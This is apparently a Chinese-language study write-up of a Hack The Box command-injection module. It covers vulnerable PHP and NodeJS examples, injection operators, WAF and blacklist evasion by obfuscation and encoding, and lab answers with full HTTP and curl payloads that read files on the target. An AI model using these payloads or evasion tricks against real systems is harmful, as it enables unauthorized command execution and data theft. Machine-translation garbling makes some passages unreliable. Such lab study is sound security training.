---
title: 命令注入
published: 2026-06-27
updated: 2026-07-15
draft: false
description: RCE-HTB
image: ""
tags:
  - 命令注入
  - RCE
  - Hack-The-Box
category: 网络安全
pinned: false
comment: true
author: Ziddzide
---


# 命令注入简介


命令注入漏洞是最严重的漏洞类型之一。它允许我们直接在后端服务器上执行系统命令，这可能导致整个网络被攻破。如果一个 Web 应用程序使用用户控制的输入在后端服务器上执行系统命令以检索并返回特定输出，我们就可以注入恶意载荷来篡改预期命令并执行我们自己的命令。

## 什么是注射？

[鉴于其高影响性和普遍性，注入漏洞在OWASP十大Web应用程序风险](https://owasp.org/www-project-top-ten/)中被列为第三大风险。注入漏洞是指用户控制的输入被错误地解释为Web查询或正在执行的代码的一部分，这可能导致查询的预期结果被篡改为对攻击者有用的结果。

根据执行的 Web 查询类型，Web 应用程序中存在多种类型的注入攻击。以下是一些最常见的注入攻击类型：

|注射|描述|
|---|---|
|操作系统命令注入|当用户输入直接用作操作系统命令的一部分时，就会发生这种情况。|
|代码注入|当用户输入直接位于执行代码的函数内部时，就会发生这种情况。|
|SQL注入|当用户输入直接用作 SQL 查询的一部分时，就会发生这种情况。|
|跨站脚本攻击/HTML注入|当用户输入的确切内容显示在网页上时，就会发生这种情况。|

除了上述类型之外，还有许多其他类型的注入，例如`LDAP injection`……`NoSQL Injection`等等。当用户输入未经适当清理就被用于查询时，攻击者有可能突破用户输入字符串的边界，将其重定向到父查询并`HTTP Header Injection`进行篡改，从而改变其预期用途。正因如此，随着更多 Web 技术被引入 Web 应用程序，我们将会看到更多类型的注入攻击出现。`XPath Injection``IMAP Injection``ORM Injection`

## 操作系统命令注入

在操作系统命令注入方面，我们控制的用户输入必须直接或间接地进入（或以某种方式影响）执行系统命令的 Web 查询。所有 Web 编程语言都提供不同的函数，使开发人员能够在需要时直接在后端服务器上执行操作系统命令。这可用于各种目的，例如安装插件或运行特定应用程序。

#### PHP 示例

例如，用 PHP 编写的 Web 应用程序`PHP`可能会使用`exec`` requests()` `system`、` requests `shell_exec`()`、`passthru``requests()` 或 `requests()``popen`函数直接在后端服务器上执行命令，每个函数的使用场景略有不同。以下代码示例展示了 PHP 代码中存在的命令注入漏洞：

`<?php if (isset($_GET['filename'])) {     system("touch /tmp/" . $_GET['filename'] . ".pdf"); } ?>`

假设某个Web应用程序具有允许用户创建新`.pdf`文档的功能，该文档会`/tmp`以用户指定的文件名创建在目录中，然后供Web应用程序进行文档处理。然而，由于请求`filename`参数中的用户输入未经任何处理（例如过滤或转义）`GET`就直接用于命令`touch`，因此该Web应用程序容易受到操作系统命令注入攻击。攻击者可以利用此漏洞在后端服务器上执行任意系统命令。
#### NodeJS 示例

这并非仅限于`PHP`某些特定框架或语言，任何 Web 开发框架或语言都可能出现这种情况。例如，如果使用 .web 开发 Web 应用程序`NodeJS`，开发人员可以使用 .web`child_process.exec`或 .web`child_process.spawn`来实现相同的目的。以下示例实现了与我们上面讨论的类似功能：

``app.get("/createfile", function(req, res){     child_process.exec(`touch /tmp/${req.query.filename}.txt`); })``

上述代码也存在命令注入漏洞，因为它未经事先清理就将请求`filename`中的参数`GET`直接用作命令的一部分。Web应用程序`PHP`都`NodeJS`可能受到相同命令注入方法的攻击。

同样，其他Web开发编程语言也具有用于相同目的的类似函数，如果存在漏洞，则可能被利用相同的命令注入方法攻击。此外，命令注入漏洞并非Web应用程序独有，如果其他二进制文件和胖客户端将未经处理的用户输入传递给执行系统命令的函数，也可能受到攻击，同样可以利用相同的命令注入方法进行攻击。

# 检测


检测基本的操作系统命令注入漏洞的过程与利用此类漏洞的过程相同。我们尝试通过各种注入方法附加我们的命令。如果命令输出与预期的正常结果不同，则说明我们已成功利用该漏洞。但对于更高级的命令注入漏洞，情况可能并非如此，因为我们可以使用各种模糊测试方法或代码审查来识别潜在的命令注入漏洞。然后，我们可以逐步构建有效载荷，直至实现命令注入。本模块将重点介绍基本的命令注入，即直接在系统命令执行函数中使用未经任何过滤的用户输入。

## 命令注入检测

当我们访问以下练习中的 Web 应用程序时，会看到一个`Host Checker`实用程序，它会要求我们输入 IP 地址以检查其是否正常运行：![主机检查器界面图像，其中有一个名为“输入 IP 地址”的文本字段，其中包含“127.0.0.1”，下方有一个“检查”按钮。](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/109/cmdinj_basic_exercise_1.jpg)

我们可以尝试输入本地主机 IP 地址`127.0.0.1`来检查其功能，不出所料，它返回了`ping`命令的输出结果，告诉我们本地主机确实处于活动状态：![主机检查器界面，包含一个用于输入 IP 地址的文本字段，输入“127.0.0.1”，一个“检查”按钮，并在下方显示 ping 结果。](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/109/cmdinj_basic_exercise_2.jpg)

虽然我们无法访问该 Web 应用程序的源代码，但`ping`根据我们收到的输出结果，我们可以有把握地推测我们输入的 IP 地址被用于执行命令。由于结果显示 ping 命令只发送了一个数据包，因此使用的命令可能是以下形式：

`ping -c 1 OUR_INPUT`

## 命令注入方法

要向目标命令中插入额外的命令，我们可以使用以下任何运算符：

| **注射字符** | **URL编码字符** | **已执行命令**        |
| -------- | ----------- | ---------------- |
| `;`      | `%3b`       | 两个都              |
| `\n`     | `%0a`       | 两个都              |
| `&`      | `%26`       | 两者（通常先显示第二个输出）   |
| `\|`     | `%7c`       | 两者（仅显示第二个输出）     |
| `&&`     | `%26%26`    | 两者兼备（仅当第一个成功时）   |
| `\|`     | `%7c%7c`    | 第二种（仅当第一种方法失败时）  |
| ` `` `   | `%60%60`    | 两者**（仅限 Linux）** |
| `$()`    | `%24%28%29` | 两者**（仅限 Linux）** |

我们可以使用这些运算符中的任何一个来注入另一个命令，以便执行其中一个`both`或`either`另一个命令。`We would write our expected input (e.g., an IP), then use any of the above operators, and then write our new command.`

一般来说，对于基本的命令注入，所有这些运算符都可以用于命令注入`regardless of the web application language, framework, or back-end server`。因此，无论我们是在服务器`PHP`上运行的 Web 应用程序`Linux`，还是在后端服务器`.Net`上运行的 Web 应用程序，我们的注入都应该能够正常工作。`Windows``NodeJS``macOS`

> 注意：唯一的例外可能是分号`;`，如果命令是用 `\` 执行的，则分号将不起作用`Windows Command Line (CMD)`，但如果命令是用 `\` 执行的，则分号仍然有效对于`Windows PowerShell`。

# 注入命令

我们可以在输入 IP 地址后添加一个分号`127.0.0.1`，然后附加我们的命令（例如`whoami`），这样我们最终使用的有效载荷就是（`127.0.0.1; whoami`），最终要执行的命令将是：

`ping -c 1 127.0.0.1; whoami`

正如我们所见，最后一个命令成功运行，我们得到了两个命令的输出（如上表中所述`;`）。现在，我们可以尝试在`Host Checker`Web 应用程序中使用之前的有效负载：![主机检查器界面，带有一个用于输入 IP 地址的文本字段，显示已输入“127.0.0.1; whoami”，一个“检查”按钮，以及一个工具提示，显示“匹配请求的格式”。](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/109/cmdinj_basic_injection.jpg)

正如我们所见，该 Web 应用程序拒绝了我们的输入，因为它似乎只接受 IP 格式的输入。然而，从错误信息来看，问题似乎出在前端而不是后端。我们可以通过`Firefox Developer Tools`点击`[CTRL + SHIFT + E]`显示“网络”选项卡，然后`Check`再次点击按钮来验证这一点：

![开发者工具界面显示“网络”选项卡。说明：执行请求或单击“重新加载”以查看网络活动详情。单击秒表图标进行性能分析。未显示任何请求。](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/109/cmdinj_basic_injection_network.jpg)

正如我们所见，点击按钮后并没有发出新的网络请求`Check`，但却收到了错误信息。这表明`user input validation is happening on the front-end`……

这似乎是为了防止我们发送恶意载荷，只允许用户以 IP 格式输入。`However, it is very common for developers only to perform input validation on the front-end while not validating or sanitizing the input on the back-end.`出现这种情况的原因有很多，例如前端和后端由两个不同的团队负责，或者信任前端验证来防止恶意载荷。

但是，正如我们将看到的，前端验证通常不足以防止注入，因为可以通过直接向后端发送自定义 HTTP 请求来轻松绕过它们。

## 绕过前端验证

自定义发送到后端服务器的 HTTP 请求最简单的方法是使用 Web 代理，它可以拦截应用程序发送的 HTTP 请求。为此，我们可以启动`Burp Suite`或配置 Firefox 来代理流量。然后，我们可以启用代理拦截功能，从 Web 应用程序发送一个标准请求（使用任意 IP 地址，例如 `https://example.com/`），然后点击 `<command>` 将拦截到的 HTTP 请求发送到`ZAP``https://example.com/` ，这样我们就得到了可以自定义的 HTTP 请求：`127.0.0.1``repeater``[CTRL + R]`

#### Burp POST 请求

![以原始格式显示的 HTTP 请求详细信息，包括 Host、User-Agent 和 Content-Type 等标头，IP 设置为 127.0.0.1。](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/109/cmdinj_basic_repeater_1.jpg)

现在我们可以自定义 HTTP 请求并发送，看看 Web 应用程序如何处理。我们将首先使用之前的有效负载（`127.0.0.1; whoami`）。我们还应该对有效负载进行 URL 编码，以确保它按预期发送。我们可以通过选择有效负载，然后单击 来完成此操作`[CTRL + U]`。最后，我们可以单击`Send`发送 HTTP 请求：

#### Burp POST 请求

![界面显示了一个 HTTP 请求和响应。请求包含 Host 和 User-Agent 等标头，以及 IP 地址“127.0.0.1; whoami”。响应显示 HTML 代码，其中包含对 127.0.0.1 的 ping 测试结果。](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/109/cmdinj_basic_repeater_2.jpg)

正如我们所看到的，这次我们得到的响应包含了命令的输出和命令`ping`的结果。`whoami``meaning that we successfully injected our new command`

# 其他操作符

## &&

我们可以从`AND`( `&&`) 运算符开始，这样我们的最终有效载荷将是 ( `127.0.0.1 && whoami`)，最终执行的命令将是以下命令：

`ping -c 1 127.0.0.1 && whoami`

现在，我们可以像之前一样，复制有效载荷，将其粘贴到 HTTP 请求中`Burp Suite`，对其进行 URL 编码，然后最后发送：![界面显示了一个 HTTP 请求和响应。请求包含 Host 和 User-Agent 等标头，以及 IP 地址“127.0.0.1+%26%26+whoami”。响应显示 HTML 代码，其中包含对 127.0.0.1 的 ping 测试结果。](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/109/cmdinj_basic_AND.jpg)

## ||

最后，我们来试试`OR``( `||`)` 注入运算符。该`OR`运算符仅在第一个命令执行失败时才执行第二个命令。这在某些情况下非常有用，例如当我们的注入操作会破坏原始命令，而我们又没有可靠的方法确保两个命令都能正常工作时。因此，使用该`OR`运算符可以让新命令在第一个命令执行失败时执行。

如果我们尝试使用通常的有效载荷和`||`运算符 ( `127.0.0.1 || whoami`)，我们会发现只有第一个命令会执行：


这是命令的工作原理决定的`bash`。当第一个命令返回退出代码`0`表示执行成功时，`bash`命令就会停止，不会尝试执行其他命令。只有当第一个命令失败并返回退出代码时，命令才会尝试执行其他命令`1`。

`Try using the above payload in the HTTP request, and see how the web application handles it.`

让我们故意破坏第一个命令，方法是不提供 IP 地址，而是直接使用`||`运算符 ( `|| whoami`)，这样`ping`命令就会失败，而我们注入的命令就会执行：


正如我们所见，这次命令在失败并返回错误信息`whoami`后确实执行了。现在，让我们尝试在 HTTP 请求中使用 ( ) 有效负载： `ping``|| whoami

此类运算符可用于各种类型的注入攻击，例如 SQL 注入、LDAP 注入、XSS、SSRF、XXE 等。我们整理了一份可用于注入攻击的最常用运算符列表：

|**注射型**|**操作员**|
|---|---|
|SQL注入|`'` `,` `;` `--` `/* */`|
|命令注入|`;` `&&`|
|LDAP注入|`*` `(` `)` `&` `\|`|
|XPath注入|`'` `or` `and` `not` `substring` `concat` `count`|
|操作系统命令注入|`;` `&` `\|`|
|代码注入|`'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^`|
|目录遍历/文件路径遍历|`../` `..\\` `%00`|
|对象注入|`;` `&` `\|`|
|XQuery注入|`'` `;` `--` `/* */`|
|Shellcode注入|`\x` `\u` `%u` `%n`|
|头部注入|`\n` `\r\n` `\t` `%0d` `%0a` `%09`|

请注意，此表并不完整，还有许多其他选项和运算符可供选择。此外，它还很大程度上取决于我们使用和测试的环境。

# 绕过过滤

## WAF检测

这表明我们发送的内容触发了安全机制，导致我们的请求被拒绝。此错误消息可以以多种方式显示。在本例中，我们将其显示在输出字段中，这意味着该请求已被`PHP`Web 应用程序本身检测并阻止`If the error message displayed a different page, with information like our IP and our request, this may indicate that it was denied by a WAF`。

## 字符被加入黑名单

Web 应用程序可能有一个黑名单字符列表，如果命令中包含这些字符，则会拒绝该请求。代码`PHP`可能如下所示：

`$blacklist = ['&', '|', ';', ...SNIP...]; foreach ($blacklist as $character) {     if (strpos($_POST['ip'], $character) !== false) {        echo "Invalid input";    } }`

### 识别被过滤的字符

## 空格绕过

#### 使用制表符

使用制表符 (%09) 代替空格或许可行，因为 Linux 和 Windows 都接受参数之间使用制表符的命令，并且它们的执行方式相同。所以，让我们尝试使用制表符代替空格字符 ( `127.0.0.1%0a%09`)，看看我们的请求是否被接受：![界面显示了一个 HTTP 请求和响应。请求包含 Host 和 User-Agent 等标头，IP 地址设置为“127.0.0.1%0a%09”。响应显示了主机检查表单的 HTML 代码以及对 127.0.0.1 的 ping 测试结果。](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/109/cmdinj_filters_spaces_3.jpg)

正如我们所见，我们通过使用制表符成功绕过了空格字符过滤器。接下来，我们来看另一种替换空格字符的方法。

#### 使用 $IFS

使用 Linux 环境变量 (\$IFS) 也可能有效，因为它的默认值是一个空格和一个制表符，这可以用于分隔命令参数。所以，如果我们在`${IFS}`应该放置空格的地方使用它，变量应该会自动替换为空格，我们的命令应该就能正常运行了。

`${IFS}`（`127.0.0.1%0a${IFS}`）：![界面显示了一个 HTTP 请求和响应。请求包含 Host 和 User-Agent 等标头，IP 地址设置为“127.0.0.1%0a${IFS}”。响应显示了主机检查表单的 HTML 代码以及对 127.0.0.1 的 ping 测试结果。](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/109/cmdinj_filters_spaces_4.jpg)

我们看到这次我们的请求没有被拒绝，我们再次绕过了空格过滤器。

#### 使用括号展开

我们还可以利用许多其他方法来绕过空格过滤器。例如，我们可以使用`Bash Brace Expansion`自动在花括号括起来的参数之间添加空格的功能，如下所示：

`ziddzide@htb[/htb]$ {ls,-la} 
total 0 drwxr-xr-x 1 21y4d 21y4d   0 Jul 13 07:37 . drwxr-xr-x 1 21y4d 21y4d   0 Jul 13 13:01 ..`

> 请查看[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space)网站上关于编写无空格命令的页面。

## 绕过目录分隔符


`/`除了注入运算符和空格字符外，斜杠或反斜杠也是常见的黑名单字符，因为在 Linux 或 Windows 系统中，它们对于指定目录至关重要。我们可以利用多种技术来生成所需的任何字符，同时避免使用黑名单字符。
### Linux

我们可以使用多种技术在有效载荷中使用斜杠。其中一种技术是使用 `\s` 替换斜杠（`\s` `or any other character`），`Linux Environment Variables`就像我们之前处理 ` \s` 一样`${IFS}`。虽然`${IFS}``\s` 会被直接替换为空格，但并没有专门用于斜杠或分号的环境变量。不过，这些字符可以在环境变量中使用，我们可以指定字符串的 `\s`  `start` 和`\s` 来精确匹配该字符。`length`


`ziddzide@htb[/htb]$ echo ${PATH} /usr/local/bin:/usr/bin:/bin:/usr/games`

所以，如果我们从字符开始`0`，并且只取长度为 n 的字符串`1`，最终只会得到`/`字符 n，我们可以将其用于有效载荷中：

        shell会话
`ziddzide@htb[/htb]$ echo ${PATH:0:1} /`

**注意：**当我们在有效载荷中使用上述命令时，我们不会添加`echo`，因为在这种情况下我们只是用它来显示输出的字符。

我们也可以使用相同的方法处理`$HOME`环境`$PWD`变量。此外，我们还可以使用相同的概念来获取分号字符，并将其用作注入运算符。例如，以下命令会生成一个分号：

`ziddzide@htb[/htb]$ echo ${LS_COLORS:10:1} ;`

### Windows

这个概念在 Windows 系统中也适用。例如，要在文本中输入斜杠`Windows Command Line (CMD)`，我们可以先使用`echo`Windows 变量（`%HOMEPATH%`-> `\Users\htb-student`），然后指定起始位置（`~6`-> `\htb-student`），最后指定一个负的结束位置，在本例中，结束位置就是用户名的长度`htb-student`（`-11`-> `\`）：

`C:\htb> echo %HOMEPATH:~6,-11% \`

我们可以使用相同的变量来实现同样的功能`Windows PowerShell`。在 PowerShell 中，单词被视为一个数组，因此我们需要指定所需字符的索引。由于我们只需要一个字符，因此无需指定起始和结束位置：

`PS C:\htb> $env:HOMEPATH[0] \ 
`PS C:\htb> $env:PROGRAMFILES[10] `

还可以使用`Get-ChildItem Env:`PowerShell 命令打印所有环境变量，然后选择其中一个来生成我们需要的字符。`Try to be creative and find different commands to produce similar characters.`

### 角色转变

还有其他方法可以在不使用字符的情况下生成所需的字符，例如`shifting characters`……。例如，以下 Linux 命令会将我们经过的字符向左移动`1`0。因此，我们只需在 ASCII 表中找到所需字符的前一个字符（我们可以使用 `\f` 命令获取`man ascii`），然后将其添加到下面的示例中，而不是使用`[``\f`。这样，最后一个打印的字符就是我们需要的字符：

`ziddzide@htb[/htb]$ man ascii     # \ is on 92, before it is [ on 91 ziddzide@htb[/htb]$ echo $(tr '!-}' '"-~'<<<[) \`

可以使用 PowerShell 命令在 Windows 中实现相同的结果，尽管它们可能比 Linux 命令要长得多。

## 绕过黑名单命令

### 命令黑名单

一个基本的命令黑名单过滤器`PHP`如下所示：

```php
$blacklist = ['whoami', 'cat', ...SNIP...]; 
foreach ($blacklist as $word) {     
	if (strpos('$_POST['ip']', $word) !== false) {        
	echo "Invalid input";    } 
	}
```

### Linux 和 Windows

一种非常常见且简单的混淆技术是在命令中插入一些通常会被命令行 shell（例如 ` `Bash`ls` 或 ` bash`）忽略的字符`PowerShell`，这样执行的命令就和没有这些字符时一样。这些字符包括单引号`'`和双引号`"`，以及其他一些字符。

最简单易用的方法是使用引号，而且引号在 Linux 和 Windows 服务器上都适用。例如，如果我们想混淆命令`whoami`，可以在命令字符之间插入单引号，如下所示：

`21y4d@htb[/htb]$ w'h'o'am'i 21y4d`

双引号也同样适用：

`21y4d@htb[/htb]$ w"h"o"am"i 21y4d`

### 仅限 Linux

我们可以在命令中间插入一些 Linux 特有的字符，`bash`shell 会忽略它们并执行命令。这些字符包括反斜杠`\`和位置参数字符`$@`。这与使用引号的方式完全相同，但这次是 `\` `the number of characters do not have to be even`，而且我们可以根据需要只插入其中一个：

`who$@ami w\ho\am\i`

### 仅限 Windows 系统

还有一些仅限 Windows 使用的字符可以插入到命令中间，这些字符不会影响命令的执行结果，例如插入符号 ( `^`)，如下例所示：

`C:\htb> who^ami 21y4d`

# 高级命令混淆


在某些情况下，我们可能会遇到高级过滤解决方案，例如 Web 应用防火墙 (WAF)，而基本的规避技术可能并不奏效。在这种情况下，我们可以采用更高级的技术，从而大大降低检测到注入命令的可能性。

## 案例操纵

我们可以使用的一种命令混淆技术是大小写操纵，例如反转命令的字符大小写（例如 `\n` `WHOAMI`）或交替使用大小写（例如 `\n` `WhOaMi`）。这种方法通常有效，因为命令黑名单可能不会检查单个单词的不同大小写形式，而 Linux 系统是区分大小写的。

如果操作的是 Windows 服务器，我们可以更改命令字符的大小写并发送。在 Windows 系统中，PowerShell 和 CMD 命令不区分大小写，这意味着无论命令以何种大小写形式编写，它们都会执行该命令：

`PS C:\htb> WhOaMi 21y4d`

然而，对于区分大小写的 Linux 和 bash shell（如前所述），我们需要发挥一些创造力，找到一个可以将命令转换为全小写单词的命令。以下是一个可行的命令：

`21y4d@htb[/htb]$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi") 21y4d`

我们还可以使用许多其他命令来实现相同的目的，例如以下命令：

`$(a="WhOaMi";printf %s "${a,,}")`

## 反向命令

我们将讨论的另一种命令混淆技术是反转命令，并使用命令模板将它们还原并实时执行。在这种情况下，我们将编写 `imaohw`，`whoami`避免触发黑名单命令。

利用这些技巧创建自己的 Linux/Windows 命令，最终执行命令，而无需包含实际的命令词。首先，我们需要在终端中获取命令的反转字符串，如下所示：

`ziddzide@htb[/htb]$ echo 'whoami' | rev imaohw`

然后，我们可以通过在子 shell 中反向执行原始命令来执行它`$()`，如下所示：

`21y4d@htb[/htb]$ $(rev<<<'imaohw') 21y4d`

> 提示：如果要使用上述方法绕过字符过滤器，则必须同时反转这些字符，或者在反转原始命令时包含这些字符。

同样的方法也适用于`Windows.`我们首先可以反转字符串的情况，如下所示：

`PS C:\htb> "whoami"[-1..-20] -join '' imaohw`

现在我们可以使用以下命令，通过 PowerShell 子 shell ( `iex "$()"`) 执行反转字符串，如下所示：

`PS C:\htb> iex "$('imaohw'[-1..-20] -join '')" 21y4d`

## 编码命令

我们将讨论的最后一种技术适用于包含被过滤字符或可能被服务器进行 URL 解码的字符的命令。这些字符可能会导致命令在到达 shell 时出现错误，最终导致执行失败。这次，我们不会直接复制现有的在线命令，而是尝试创建我们自己的独特的混淆命令。这样，它被过滤器或 Web 应用防火墙 (WAF) 拦截的可能性就大大降低了。我们创建的命令将根据允许的字符以及服务器的安全级别而有所不同。

我们可以使用各种编码工具，例如`base64`（用于 b64 编码）或`xxd`（用于十六进制编码）。举`base64`个例子，首先，我们将对要执行的有效载荷（包含过滤后的字符）进行编码：

`ziddzide@htb[/htb]$ echo -n 'cat /etc/passwd | grep 33' | base64 Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==`

现在我们可以创建一个命令，该命令将在子 shell 中解码编码后的字符串`$()`，然后将其传递给`bash`要执行的程序（即`bash<<<`），如下所示：

`ziddzide@htb[/htb]$ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin`

如我们所见，上述命令执行完美。我们没有包含任何过滤字符，也避免使用可能导致命令执行失败的编码字符。

> 提示：请注意，我们这样做是`<<<`为了避免使用竖线（管道符）`|`，因为竖线是过滤字符。

我们在 Windows 系统中也使用相同的技术。首先，我们需要对字符串进行 base64 编码，如下所示：

`PS C:\htb> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami')) dwBoAG8AYQBtAGkA`

在 Linux 系统上也可以实现同样的效果，但我们需要先将字符串从 转换为，`utf-8`如下所示：`utf-16``base64`

`ziddzide@htb[/htb]$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64 dwBoAG8AYQBtAGkA`

最后，我们可以解码 b64 字符串，并使用 PowerShell 子 shell ( `iex "$()"`) 执行它，如下所示：

`PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))" 21y4d`

正如我们所见，我们可以发挥创意`Bash`，`PowerShell`创造出以前从未用过的绕过和混淆方法，这些方法很可能绕过过滤器和Web应用防火墙（WAF）。一些工具可以帮助我们自动混淆命令，我们将在下一节中讨论这些工具。

# 规避工具

## Linux（Bashfuscator）

[我们可以使用Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)这个便捷的工具来混淆 bash 命令。我们可以从 GitHub 克隆该仓库，然后按如下方式安装其依赖项：

```
ziddzide@htb[/htb]$ git clone https://github.com/Bashfuscator/Bashfuscator ziddzide@htb[/htb]$ cd Bashfuscator 
ziddzide@htb[/htb]$ pip3 install setuptools==65 
ziddzide@htb[/htb]$ python3 setup.py install --user
```


工具设置完成后，我们就可以从`./bashfuscator/bin/`目录中开始使用它了。正如帮助菜单中所示，我们可以使用该工具的许多标志来微调最终的混淆命令`-h`：


我们可以先简单地提供要用`-c`标志进行混淆的命令：

`ziddzide@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd'`

然而，以这种方式运行该工具会随机选择一种混淆技术，导致命令长度从几百个字符到超过一百万个字符不等！因此，可以使用帮助菜单中的一些标志来生成更短更简单的混淆命令，如下所示：

`ziddzide@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1 `
现在可以使用以下命令测试输出的命令`bash -c ''`，看看它是否执行了预期的命令：

`ziddzide@htb[/htb]$ bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"' root:x:0:0:root:/root:/bin/bash ...SNIP...`

我们可以看到，混淆后的命令虽然看起来完全被混淆了，但仍然有效，与原始命令完全不同。我们还可以注意到，该工具使用了多种混淆技术，包括我们之前讨论过的以及其他许多技术。

## Windows（DOSfuscation）

还有一个非常类似的工具，适用于 Windows 系统，名为[DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation)。与 不同的是`Bashfuscator`，这是一个交互式工具，我们只需运行一次，即可通过交互来获取所需的混淆命令。我们可以再次从 GitHub 克隆该工具，然后通过 PowerShell 调用它，如下所示：

```
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt 
Invoke-DOSfuscation> encoding 
Invoke-DOSfuscation\Encoding> 1 

...SNIP... 
Result: 
typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
```

# 问题

##### 尝试在 IP 字段的 ip 后面添加任意注入运算符。错误信息是什么（英文）？

```
Please match the required format
```

##### 查看页面的HTML源代码，找到前端输入验证发生的位置。它在哪一行？

```
17
```

#####  尝试使用剩余的三个注入运算符（换行符、&、|），看看它们各自的作用以及输出结果有何不同。哪一个运算符只显示注入命令的输出？

只能是`|`,换行符会破坏命令导致无法输出，至于`&`会导致两条命令同时执行，无法显示

```http
POST / HTTP/1.1
Host: 154.57.164.72:31533
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
Origin: http://154.57.164.72:31533
Connection: keep-alive
Referer: http://154.57.164.72:31533/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

ip=127.0.0.1 & whoami
```

##### 尝试所有其他注入运算符，看看是否有任何运算符未被列入黑名单。Web 应用程序不会将换行符、& 或 | 列入黑名单，请问哪个运算符未被列入黑名单？

绕过命令注入黑名单，使用攻击模块跑字典就行

```
\n
```

这里探测&的时候也可以显示正常命令但是&后的命令变蓝了输入答案也不对，bp里当作连接参数的连接符了错误判断了，需要转化为url编码进行测试

##### 运用本节所学知识执行命令“ls -la”。“index.php”文件的大小是多少？

这里说的本节主要讲的是空白字符绕过

```
curl -X POST -H 'Referer: http://154.57.164.82:30833/' -H 'Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5' -H 'Origin: http://154.57.164.82:30833' -H 'Upgrade-Insecure-Requests: 1' -H 'Priority: u=0, i' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -d 'ip=%0als${IFS}-la' 'http://154.57.164.82:30833/'
```

payload

```
ip=%0als${IFS}-la
```

##### 查找“/home”文件夹中的用户名

只需要绕过`/`字符即可

```
ip=%0als${IFS}-la${IFS}${PATH:0:1}home
```

##### 找到之前找到的用户主文件夹中的 flag.txt 文件的内容。

需要绕过黑名单，使用`'`即可

```
ip=127.0.0.1%0ac'a't${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
```

##### 使用本节中学到的技巧之一，查找以下命令的输出：find /usr/share/ | grep root | grep mysql | tail -n 1

替换`空格`，`/`，以及`关键词`和`|`即可

```
ip=%0at'ai'l${IFS}-n${IFS}1<<<$(g're'p${IFS}m'ys'ql<<<$(g're'p${IFS}root<<<$(f'in'd${IFS}${PATH:0:1}u's'r${IFS}${PATH:0:1}sh'ar'e)))
```

##### 技能评估

最开始找的时候,观察到uri有一个to参数很敏感,直接尝试没有结果

但是**复制/移动文件功能**有着很强的RCE特征,准备操作:

最开始针对`cp`命令测试:发现会自动补全文件名,导致命令被嵌在文件名当中导致失败,尝试很多没有结果

然后尝试`mv`命令测试:发现确实存在注入点,bp的请求为

```
GET /index.php?to=tmp%26c'a't${IFS}${PATH:0:1}flag.txt&from=787113764.txt&finish=1&move=1 HTTP/1.1
Host: 154.57.164.81:32567
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://154.57.164.81:32567/index.php?to=tmp&from=787113764.txt
Connection: keep-alive
Cookie: filemanager=5uoqi6d2h2perl174hc45s5q6q
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

返回`flag`.